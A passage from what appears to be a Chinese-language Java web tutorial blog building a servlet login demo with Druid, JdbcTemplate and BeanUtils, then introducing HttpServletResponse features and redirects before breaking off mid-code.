<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>login.html<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/loginservlet"</span>&gt;</span></span><br><span class="line">        用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>druid.properties<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">driverClassName</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line"><span class="attr">url</span>=jdbc:mysql://localhost:<span class="number">3306</span>/db3?useSSL=<span class="literal">false</span>&amp;serverTimezone=GMT%<span class="number">2</span>B8</span><br><span class="line"><span class="attr">username</span>=root</span><br><span class="line"><span class="attr">password</span>=root</span><br><span class="line"><span class="comment">#初始化连接数量</span></span><br><span class="line"><span class="attr">initialSize</span>=<span class="number">5</span></span><br><span class="line"><span class="comment">#最大连接数</span></span><br><span class="line"><span class="attr">maxActive</span>=<span class="number">10</span></span><br><span class="line"><span class="comment">#最大等待时间</span></span><br><span class="line"><span class="attr">maxWait</span>=<span class="number">3000</span></span><br></pre></td></tr></table></figure></p>
<p>这两个是最基本的文件，jar包我直接使用maven导入了，不多说</p>
<ul>
<li><p>步骤：</p>
<ol>
<li><p>创建项目，导入html页面，配置文件，jar包</p>
</li>
<li><p>配置数据库环境</p>
</li>
<li><p>创建包cn.itcast.domain，创建类User</p>
</li>
<li><p>创建包cn.itcast.dao，创建类UserDao,提供login方法</p>
</li>
<li><p>创建cn.itcast.web.servlet.LoginServlet类</p>
</li>
<li><p>login.html中form表单的action路径是虚拟路径</p>
</li>
</ol>
</li>
</ul>
<p>用户实体类User<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package cn.itcast.domain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用户的实体类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(<span class="keyword">String</span> username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(<span class="keyword">String</span> password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"id="</span> + id +</span><br><span class="line">                <span class="string">", username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>JDBC工具类JDBCUtil<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package cn.itcast.until;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JDBC工具类 使用Druid连接池</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">DataSource</span> ds;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载配置文件</span></span><br><span class="line">            <span class="type">Properties</span> pro=new <span class="type">Properties</span>();</span><br><span class="line">            <span class="comment">//使用ClassLoader加载配置文件，获取字节输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="keyword">is</span> = <span class="type">JDBCUtil</span><span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>().<span class="title">getResourceAsStream</span>("<span class="title">src</span>/<span class="title">main</span>/<span class="title">resources</span>/<span class="title">druid</span>.<span class="title">properties</span>");</span></span><br><span class="line"><span class="class">            <span class="title">pro</span>.<span class="title">load</span>(<span class="title">is</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            //2.初始化连接池对象</span></span><br><span class="line"><span class="class">            <span class="title">ds</span>=<span class="title">DruidDataSourceFactory</span>.<span class="title">createDataSource</span>(<span class="title">pro</span>);</span></span><br><span class="line"><span class="class">        &#125; <span class="title">catch</span> (<span class="title">IOException</span> <span class="title">e</span>) </span>&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="type">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.获取连接池对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">DataSource</span> getDataSource()&#123;</span><br><span class="line">        <span class="keyword">return</span> ds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.获取Connection对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Connection</span> getConnection() <span class="keyword">throws</span> <span class="type">SQLException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>操作类UserDao<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package cn.itcast.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.<span class="keyword">domain</span>.<span class="keyword">User</span>;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.<span class="keyword">until</span>.JDBCUtil;</span><br><span class="line"><span class="keyword">import</span> org.springframework.dao.DataAccessException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.BeanPropertyRowMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 操作数据库中User表的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> UserDao &#123;</span><br><span class="line"></span><br><span class="line">    //声明JDBCTemplate对象公用</span><br><span class="line">    private JdbcTemplate template=<span class="built_in">new</span> JdbcTemplate(JDBCUtil.getDataSource());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登陆方法</span></span><br><span class="line"><span class="comment">     * @param loginUser 只有用户名和密码</span></span><br><span class="line"><span class="comment">     * @return user包含用户全部数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">public</span> <span class="keyword">User</span> <span class="keyword">login</span>(<span class="keyword">User</span> loginUser)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //<span class="number">1.</span>编写<span class="keyword">sql</span></span><br><span class="line">            String <span class="keyword">sql</span>="select * from user where username=? and password=?";</span><br><span class="line">            //<span class="number">2.</span>调用query()方法</span><br><span class="line">            <span class="keyword">User</span> <span class="keyword">user</span>=<span class="keyword">template</span>.queryForObject(<span class="keyword">sql</span>,<span class="built_in">new</span> BeanPropertyRowMapper&lt;<span class="keyword">User</span>&gt;(<span class="keyword">User</span>.<span class="keyword">class</span>),</span><br><span class="line">                    loginUser.getUsername(),</span><br><span class="line">                    loginUser.getPassword());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">user</span>;</span><br><span class="line">        &#125;catch (DataAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>创建LoginServlet<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.dao.<span class="type">UserDao</span>;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.domain.<span class="type">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.设置编码</span></span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        <span class="comment">//2.获取请求参数</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span class="string">"username"</span>);</span><br><span class="line">        <span class="type">String</span> password = request.getParameter(<span class="string">"password"</span>);</span><br><span class="line">        <span class="comment">//3.封装user对象</span></span><br><span class="line">        <span class="type">User</span> loginUser=<span class="keyword">new</span> <span class="type">User</span>();</span><br><span class="line">        loginUser.setUsername(username);</span><br><span class="line">        loginUser.setPassword(password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.调用UserDao的login方法</span></span><br><span class="line">        <span class="type">UserDao</span> dao=<span class="keyword">new</span> <span class="type">UserDao</span>();</span><br><span class="line">        <span class="type">User</span> user = dao.login(loginUser);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.判断user</span></span><br><span class="line">        <span class="keyword">if</span> (user==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//登录失败</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/failServlet"</span>).forward(request, response);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//登录成功</span></span><br><span class="line">            <span class="comment">//存储数据</span></span><br><span class="line">            request.setAttribute(<span class="string">"user"</span>,user);</span><br><span class="line">            <span class="comment">//转发</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/successServlet"</span>).forward(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>failServlet<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">FailServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//给页面写一句话</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置编码</span></span><br><span class="line">        response.setContentType(<span class="string">"text/html;charset=utf-8"</span>);</span><br><span class="line">        <span class="comment">//输出</span></span><br><span class="line">        response.getWriter().write(<span class="string">"登录失败，用户名或密码错误"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>successServlet<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.domain.<span class="type">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">SuccessServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取request域中共享的user对象</span></span><br><span class="line">        <span class="type">User</span> user = (<span class="type">User</span>) request.getAttribute(<span class="string">"user"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//给页面写一句话</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置编码</span></span><br><span class="line">            response.setContentType(<span class="string">"text/html;charset=utf-8"</span>);</span><br><span class="line">            <span class="comment">//输出</span></span><br><span class="line">            response.getWriter().write(<span class="string">"登录成功"</span>+user.getUsername()+<span class="string">"欢迎您"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="BeanUtils工具类"><a href="#BeanUtils工具类" class="headerlink" title="BeanUtils工具类"></a>BeanUtils工具类</h2><p>BeanUtils实际上就是帮助封装的工具类</p>
<p>先将LoginServlet中的封装过程注释掉，并使用BeanUtils<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.dao.<span class="type">UserDao</span>;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.domain.<span class="type">User</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.<span class="type">BeanUtils</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.<span class="type">InvocationTargetException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">Map</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.设置编码</span></span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line"><span class="comment">//        //2.获取请求参数</span></span><br><span class="line"><span class="comment">//        String username = request.getParameter("username");</span></span><br><span class="line"><span class="comment">//        String password = request.getParameter("password");</span></span><br><span class="line"><span class="comment">//        //3.封装user对象</span></span><br><span class="line"><span class="comment">//        User loginUser=new User();</span></span><br><span class="line"><span class="comment">//        loginUser.setUsername(username);</span></span><br><span class="line"><span class="comment">//        loginUser.setPassword(password);</span></span><br><span class="line">        <span class="comment">//2.获取所有请求参数</span></span><br><span class="line">        <span class="type">Map</span>&lt;<span class="type">String</span>, <span class="type">String</span>[]&gt; map = request.getParameterMap();</span><br><span class="line">        <span class="comment">//3.创建User对象</span></span><br><span class="line">        <span class="type">User</span> loginUser = <span class="keyword">new</span> <span class="type">User</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//3.1使用BeanUtils封装</span></span><br><span class="line">            <span class="type">BeanUtils</span>.populate(loginUser,map);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="type">IllegalAccessException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="type">InvocationTargetException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.调用UserDao的login方法</span></span><br><span class="line">        <span class="type">UserDao</span> dao=<span class="keyword">new</span> <span class="type">UserDao</span>();</span><br><span class="line">        <span class="type">User</span> user = dao.login(loginUser);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.判断user</span></span><br><span class="line">        <span class="keyword">if</span> (user==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//登录失败</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/failServlet"</span>).forward(request, response);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//登录成功</span></span><br><span class="line">            <span class="comment">//存储数据</span></span><br><span class="line">            request.setAttribute(<span class="string">"user"</span>,user);</span><br><span class="line">            <span class="comment">//转发</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/successServlet"</span>).forward(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>用于封装JavaBean的</p>
<ol>
<li><p>JavaBean：标准的Java类</p>
<ol>
<li><p>要求</p>
<ol>
<li><p>类必须被public修饰</p>
</li>
<li><p>必须提供空参的构造器</p>
</li>
<li><p>成员变量必须使用private修饰</p>
</li>
<li><p>提供公共的setter和getter方法</p>
</li>
</ol>
</li>
<li><p>功能：封装数据</p>
</li>
</ol>
</li>
<li><p>方法：</p>
<ol>
<li><p>setProperty()</p>
</li>
<li><p>getProperty()</p>
</li>
<li><p>populate(Object obj,Map map)：将map集合的键值对信息，封装到对应的JavaBean对象中</p>
</li>
</ol>
</li>
</ol>
<h1 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>设置响应消息</p>
<ol>
<li><p>设置响应行</p>
<ol>
<li><p>格式：HTTP/1.1 200 OK</p>
</li>
<li><p>设置状态码：setStatus(int sc)</p>
</li>
</ol>
</li>
<li><p>设置响应头:setHeader(String name,String value)</p>
</li>
<li><p>设置响应体</p>
<ul>
<li><p>使用步骤：</p>
<ol>
<li><p>获取输出流</p>
<ul>
<li><p>字符输出流：PrintWriter getWriter()</p>
</li>
<li><p>字节输出流：ServletOutputStream getOutputStream()</p>
</li>
</ul>
</li>
<li><p>使用输出流，将数据输出到客户端浏览器</p>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol>
<li><p>完成重定向</p>
</li>
<li><p>服务器输出字符数据到浏览器</p>
</li>
<li><p>服务器输出字节数据到浏览器</p>
</li>
<li><p>验证码</p>
</li>
</ol>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>demo1<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 重定向</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo1被访问了"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //访问/response1 会自动跳转到/response2资源</span></span><br><span class="line"><span class="comment">//        //1.设置访问码为302</span></span><br><span class="line"><span class="comment">//        response.setStatus(302);</span></span><br><span class="line"><span class="comment">//        //2.设置响应头location</span></span><br><span class="line"><span class="comment">//        response.setHeader("location","/response/response2");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //简单的重定向方法</span></span><br><span class="line"><span class="comment">////        response.sendRedirect("/response/response2");</span></span><br><span class="line">            response.sendRedirect(<span class="string">"http://www.51nd0re1.cn"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>demo2<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo2被访问了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span 